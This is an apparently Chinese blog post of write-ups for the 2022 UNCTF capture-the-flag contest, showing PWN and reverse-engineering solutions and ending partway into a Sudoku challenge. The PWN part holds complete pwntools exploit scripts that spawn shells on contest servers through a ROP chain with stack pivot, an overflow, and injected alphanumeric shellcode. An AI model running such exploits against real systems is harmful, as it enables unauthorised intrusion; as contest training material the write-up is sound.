<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="Theffth"><meta name="copyright" content="Theffth"><meta name="generator" content="Hexo 4.2.1"><meta name="theme" content="hexo-theme-yun"><title>2022UNCTF WP | T君的小屋</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.21/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link rel="shortcut icon" type="image/svg+xml" href="/logo.svg"><link rel="mask-icon" href="/logo.svg" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><link rel="alternate" href="/atom.xml" title="T君的小屋"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"theffth.github.io","root":"/","title":"T君的小屋","version":"1.2.0","mode":"auto","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><meta name="description" content="新生赛部分WP">
<meta property="og:type" content="article">
<meta property="og:title" content="2022UNCTF WP">
<meta property="og:url" content="http://theffth.github.io/2022/12/29/2022UNCTF-WP/index.html">
<meta property="og:site_name" content="T君的小屋">
<meta property="og:description" content="新生赛部分WP">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221113104410970.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116094606350.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140803200.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140458328.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117135322609.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117141106499.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118142655886.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116165624834.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116211723907.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092320165.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117092333377.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117093454398.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117094203988.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110630996.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117110717023.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117144537403.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118092132508.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202857997.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116202829711.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117123451675.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093451420.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093253637.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132904940.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117132832711.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215857086.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117215940843.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118093836905.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101406326.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118101446316.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105222600.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118105303259.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118110239743.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118112303821.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118130508349.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221118131655862.png">
<meta property="og:image" content="c:%5CUsers%5C%E8%A2%81%E6%A2%A6%E5%A8%87%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221118140927261.png">
<meta property="article:published_time" content="2022-12-29T11:38:19.000Z">
<meta property="article:modified_time" content="2022-12-30T10:02:24.027Z">
<meta property="article:author" content="Theffth">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221113104410970.png"><script src="/js/ui/mode.js"></script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="stylesheet" href="/js/prism/prism.css"><link rel="alternate" href="/atom.xml" title="T君的小屋" type="application/atom+xml">
</head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info mickey-mouse"><a class="site-author-avatar" href="/about/" title="Theffth"><img width="96" loading="lazy" src="https://i.loli.net/2020/10/23/EgpBftlhNG5Xaxb.png" alt="Theffth"><span class="site-author-status" title="dropping hair">😆</span></a><div class="site-author-name"><a href="/about/">Theffth</a></div><a class="site-name" href="/about/site.html">T君的小屋</a><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" href="https://yun.yunyoujun.cn" target="_blank" rel="noopener" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Theffth" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:1102468264@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2022UNCTF-WP"><span class="toc-number">1.</span> <span class="toc-text">2022UNCTF - WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">1.1.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#welcomeUNCTF2022-云南警官学院"><span class="toc-number">1.1.1.</span> <span class="toc-text">welcomeUNCTF2022-云南警官学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#石头剪刀布-西华大学"><span class="toc-number">1.1.2.</span> <span class="toc-text">石头剪刀布-西华大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#move-your-heart-中国计量大学现代科技学院"><span class="toc-number">1.1.3.</span> <span class="toc-text">move your heart-中国计量大学现代科技学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin-珠海科技学院"><span class="toc-number">1.1.4.</span> <span class="toc-text">checkin-珠海科技学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#int-0x80-中国计量大学现代科技学院"><span class="toc-number">1.1.5.</span> <span class="toc-text">int 0x80-中国计量大学现代科技学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fakehero-西华大学"><span class="toc-number">1.1.6.</span> <span class="toc-text">fakehero-西华大学</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">1.2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#whereisyourkey-广东海洋大学"><span class="toc-number">1.2.1.</span> <span class="toc-text">whereisyourkey-广东海洋大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezzzzre-广东海洋大学"><span class="toc-number">1.2.2.</span> <span class="toc-text">ezzzzre-广东海洋大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudoku-陆军工程大学"><span class="toc-number">1.2.3.</span> <span class="toc-text">Sudoku-陆军工程大学</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">1.3.</span> <span class="toc-text">crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-1-西南科技大学"><span class="toc-number">1.3.1.</span> <span class="toc-text">md5-1-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dddd-西南科技大学"><span class="toc-number">1.3.2.</span> <span class="toc-text">dddd-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#caesar-西南科技大学"><span class="toc-number">1.3.3.</span> <span class="toc-text">caesar-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-2-西南科技大学"><span class="toc-number">1.3.4.</span> <span class="toc-text">md5-2-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyRSA-广东海洋大学"><span class="toc-number">1.3.5.</span> <span class="toc-text">babyRSA-广东海洋大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezRSA-广东海洋大学"><span class="toc-number">1.3.6.</span> <span class="toc-text">ezRSA-广东海洋大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-RSA-中国人民公安大学"><span class="toc-number">1.3.7.</span> <span class="toc-text">easy_RSA-中国人民公安大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Single-table-西南科技大学"><span class="toc-number">1.3.8.</span> <span class="toc-text">Single table-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Multi-table-西南科技大学"><span class="toc-number">1.3.9.</span> <span class="toc-text">Multi table-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezxor-浙江师范大学"><span class="toc-number">1.3.10.</span> <span class="toc-text">ezxor-浙江师范大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fermat-西南科技大学"><span class="toc-number">1.3.11.</span> <span class="toc-text">Fermat-西南科技大学</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.4.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到-吉林警察学院"><span class="toc-number">1.4.1.</span> <span class="toc-text">签到-吉林警察学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezgame-浙江师范大学"><span class="toc-number">1.4.2.</span> <span class="toc-text">ezgame-浙江师范大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我太喜欢bilibili大学啦–中北大学"><span class="toc-number">1.4.3.</span> <span class="toc-text">我太喜欢bilibili大学啦–中北大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#给你一刀-西南科技大学"><span class="toc-number">1.4.4.</span> <span class="toc-text">给你一刀-西南科技大学</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.5.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#社什么社-湖南警察学院"><span class="toc-number">1.5.1.</span> <span class="toc-text">社什么社-湖南警察学院</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic-word-西南科技大学"><span class="toc-number">1.5.2.</span> <span class="toc-text">magic_word-西南科技大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#找得到我吗-闽南师范大学"><span class="toc-number">1.5.3.</span> <span class="toc-text">找得到我吗-闽南师范大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#syslog-浙江师范大学"><span class="toc-number">1.5.4.</span> <span class="toc-text">syslog-浙江师范大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#In-the-Morse-Garden-陆军工程大学"><span class="toc-number">1.5.5.</span> <span class="toc-text">In_the_Morse_Garden-陆军工程大学</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zhiyin-中国人民公安大学"><span class="toc-number">1.5.6.</span> <span class="toc-text">zhiyin-中国人民公安大学</span></a></li></ol></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/977-1365/" style="font-size: 12px; color: #999">977 1365</a> <a href="/tags/WP/" style="font-size: 12px; color: #999">WP</a> <a href="/tags/compiler/" style="font-size: 12px; color: #999">compiler</a> <a href="/tags/shellshock/" style="font-size: 12px; color: #999">shellshock</a> <a href="/tags/%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E/" style="font-size: 12px; color: #999">竞态条件漏洞</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://theffth.github.io/2022/12/29/2022UNCTF-WP/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Theffth"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="T君的小屋"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2022UNCTF WP</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2022-12-29 19:38:19" itemprop="dateCreated datePublished" datetime="2022-12-29T19:38:19+08:00">2022-12-29</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <time title="Modified: 2022-12-30 18:02:24" itemprop="dateModified" datetime="2022-12-30T18:02:24+08:00">2022-12-30</time></div><div class="post-classify"><span class="post-category"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span> <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/CTF/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/WP/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">WP</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><h1 id="2022UNCTF-WP"><a href="#2022UNCTF-WP" class="headerlink" title="2022UNCTF - WP"></a>2022UNCTF - WP</h1><p>11月份混了一下校内赛，我还是一如既往的菜哇T^T~</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="welcomeUNCTF2022-云南警官学院"><a href="#welcomeUNCTF2022-云南警官学院" class="headerlink" title="welcomeUNCTF2022-云南警官学院"></a>welcomeUNCTF2022-云南警官学院</h3><p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221113104410970.png" alt="" loading="lazy"></p>
<h3 id="石头剪刀布-西华大学"><a href="#石头剪刀布-西华大学" class="headerlink" title="石头剪刀布-西华大学"></a>石头剪刀布-西华大学</h3><pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

//0:rock 1:scissor 2:paper
int main(){
    srand(10);
    int i;
    int r[100]={0};
    int tmp;
    for(i=0;i&lt;100;i++){
        tmp=rand()%3;
        //1-&gt;0,0-&gt;2,2-&gt;1
        if(tmp==1) r[i]=0;
        else if(tmp==0) r[i]=2;
        else r[i]=1;
    }
    for(i=0;i&lt;100;i++) printf(&quot;%d&quot;,r[i]);
    return 0;
}</code></pre>
<pre><code class="line-numbers language-python">from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

local=0
binary_name=&#39;game&#39;
if local:
    p=process(&#39;./&#39;+binary_name)
    e=ELF(&#39;./&#39;+binary_name)
    libc=e.libc
else:
    p=remote(&quot;node.yuzhian.com.cn&quot;,34799)
    e=ELF(&#39;./&#39;+binary_name)
    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def z(a=&#39;&#39;):
    if local:
        gdb.attach(p,a)
        if a==&#39;&#39;:
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch==&#39;i386&#39;):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b&#39;\x00&#39;))

str=&quot;0011211011112210201220000100022120122021010120002212101022110010111102121220111220202212022100002001&quot;
sla(&quot;Will you learn about something of pwn later?(y/n)&quot;,b&#39;y&#39;)
for i in range(0,100):
    sla(&quot;\x1B[0m\n&quot;,str[i])
p.interactive()</code></pre>
<h3 id="move-your-heart-中国计量大学现代科技学院"><a href="#move-your-heart-中国计量大学现代科技学院" class="headerlink" title="move your heart-中国计量大学现代科技学院"></a>move your heart-中国计量大学现代科技学院</h3><pre><code class="line-numbers language-python">from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

local=0
binary_name=&#39;move&#39;
if local:
    p=process(&#39;./&#39;+binary_name)
    e=ELF(&#39;./&#39;+binary_name)
    libc=e.libc
else:
    p=remote(&quot;node.yuzhian.com.cn&quot;,32533)
    e=ELF(&#39;./&#39;+binary_name)
    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def z(a=&#39;&#39;):
    if local:
        gdb.attach(p,a)
        if a==&#39;&#39;:
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch==&#39;i386&#39;):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))

z(&quot;b main&quot;)
sla(&quot;input a num:&quot;,&quot;286129175&quot;)
p.recvuntil(&quot;gift:&quot;)
pause()
leak_addr=int(p.recv(14),16)
print(hex(leak_addr))
system=0x4010D0
bin_sh=leak_addr+0x18
pop_rdi_ret=0x4013d3
leave_ret=0x4012D6
pd=p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+b&quot;/bin/sh;&quot;+p64(leak_addr-8)+p64(leave_ret)
sd(pd)
p.interactive()</code></pre>
<h3 id="checkin-珠海科技学院"><a href="#checkin-珠海科技学院" class="headerlink" title="checkin-珠海科技学院"></a>checkin-珠海科技学院</h3><pre><code class="line-numbers language-python">from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

local=0
binary_name=&#39;checkin&#39;
if local:
    p=process(&#39;./&#39;+binary_name)
    e=ELF(&#39;./&#39;+binary_name)
    libc=e.libc
else:
    p=remote(&quot;node.yuzhian.com.cn&quot;, 34258)
    e=ELF(&#39;./&#39;+binary_name)
    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def z(a=&#39;&#39;):
    if local:
        gdb.attach(p,a)
        if a==&#39;&#39;:
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch==&#39;i386&#39;):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))

sla(&quot;name: &quot;,&quot;aa&quot;)
sla(&quot;Please input size: &quot;,&quot; -1&quot;)
sl(b&#39;a&#39;*0x100)
p.interactive()</code></pre>
<h3 id="int-0x80-中国计量大学现代科技学院"><a href="#int-0x80-中国计量大学现代科技学院" class="headerlink" title="int 0x80-中国计量大学现代科技学院"></a>int 0x80-中国计量大学现代科技学院</h3><p>谷歌<code>__ctype_b_loc</code>可知需要可打印字符，</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221116094606350.png" alt="" loading="lazy"></p>
<p>注入64位可打印shellcode即可：</p>
<pre><code class="line-numbers language-python">from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

local=0
binary_name=&#39;int0x80&#39;
if local:
    p=process(&#39;./&#39;+binary_name)
    e=ELF(&#39;./&#39;+binary_name)
    libc=e.libc
else:
    p=remote(&quot;node.yuzhian.com.cn&quot;,30592)
    e=ELF(&#39;./&#39;+binary_name)
    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def z(a=&#39;&#39;):
    if local:
        gdb.attach(p,a)
        if a==&#39;&#39;:
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch==&#39;i386&#39;):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,&#39;\x00&#39;))

z()

shellcode=shellcraft.sh()
ru(&quot;hello pwn\n&quot;)
#pause() 
sd(&quot;Vh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;)
p.interactive()</code></pre>
<p>这里用了alpha3工具（<a href="https://github.com/TaQini/alpha3），但是我用自己生成的shellcode作为输入跑不通，使用工具的才行emmm，暂时还不清楚原因" target="_blank" rel="noopener">https://github.com/TaQini/alpha3），但是我用自己生成的shellcode作为输入跑不通，使用工具的才行emmm，暂时还不清楚原因</a></p>
<h3 id="fakehero-西华大学"><a href="#fakehero-西华大学" class="headerlink" title="fakehero-西华大学"></a>fakehero-西华大学</h3><pre><code class="line-numbers language-python">from pwn import *
#from LibcSearcher import LibcSearcher
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;)

local=0
binary_name=&#39;prog&#39;
if local:
    p=process(&#39;./&#39;+binary_name)
    e=ELF(&#39;./&#39;+binary_name)
    libc=e.libc
else:
    p=remote(&quot;node.yuzhian.com.cn&quot;,38527)
    e=ELF(&#39;./&#39;+binary_name)
    libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)

def z(a=&#39;&#39;):
    if local:
        gdb.attach(p,a)
        if a==&#39;&#39;:
            raw_input
    else:
        pass
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()
def leak_address():
    if(context.arch==&#39;i386&#39;):
        return u32(p.recv(4))
    else :
        return u64(p.recv(6).ljust(8,b&#39;\x00&#39;))

def menu(cho):
    ru(&quot;&gt; &quot;)
    sl(str(cho))

def add(idx,size,content):
    menu(1)
    sla(&quot;index: \n&quot;,str(idx))
    sla(&quot;Size: \n&quot;,str(size))
    ru(&quot;Content: &quot;)
    sd(content)
def delete(idx):
    menu(2)
    sla(&quot;Index: \n&quot;,str(idx))

#z()
shellcode=asm(shellcraft.sh())
add(0x9,0x100,shellcode)
menu(3)
p.interactive()</code></pre>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h3><pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;

int main()
{
    int v5[10] = {&#39;v&#39;, &#39;g&#39;, &#39;p&#39;, &#39;k&#39;, &#39;c&#39;, &#39;m&#39;, &#39;h&#39;, &#39;n&#39;, &#39;c&#39;, &#39;i&#39;};
    int i;
    for (i = 0; i &lt; 10; i++)
    {
        if (v5[i] == &#39;m&#39;)
            v5[i] = &#39;m&#39;;
        else if (v5[i] &lt;= &#39;o&#39;)
        {
            if (v5[i] &lt;= &#39;n&#39;)
                v5[i] -= 2;
        }
        else
        {
            v5[i] += 3;
        }
    }
    for (i = 0; i &lt; 10; i++)
    {
        printf(&quot;%c&quot;, v5[i]);
    }
    return 0;
}</code></pre>
<h3 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h3><p>先upx脱壳，看到程序逻辑：</p>
<pre><code class="line-numbers language-C">#include &lt;stdio.h&gt;

int main(){
    char s[8]={&quot;HELLOCTF&quot;};
    char flag[8]={0};
    int i;
    for(i=0;i&lt;8;i++){
        flag[i]=2*s[i]-69;
    }
    for(i=0;i&lt;8;i++){
        printf(&quot;%c&quot;,flag[i]);
    }
    return 0;
}</code></pre>
<h3 id="Sudoku-陆军工程大学"><a href="#Sudoku-陆军工程大学" class="headerlink" title="Sudoku-陆军工程大学"></a>Sudoku-陆军工程大学</h3><p>程序要求我们的输入与v12数组中的值相同：</p>
<p><img src="https://raw.githubusercontent.com/Theffth/PictureBed/master/img/2022/image-20221117140803200.png" alt="" loading="lazy"></p>
<p>动调到输入之前，在栈中找到v12的数据：</p>
